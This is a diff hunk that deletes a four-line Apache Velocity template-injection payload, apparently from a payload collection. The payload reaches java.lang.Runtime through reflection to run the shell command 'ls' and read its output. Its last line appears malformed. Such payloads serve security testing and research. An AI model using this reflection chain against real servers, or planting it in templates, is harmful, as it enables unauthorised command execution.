@@ -1,4 +1,0 @@
-#set($e="e")
-$process=$e.getClass().forName('java.lang.Process').getMethod('getInputStream').invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).getClass().getMethod('exec', $e.getClass().forName('java.lang.String')).invoke( $e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null) ,'ls'))
-$e.getClass().forName('java.io.InputStream').getMethod('available').invoke($process).toString()
-$e.getClass().forName('java.io.InputStream').getMethod('read', byte[], int, int).toString()
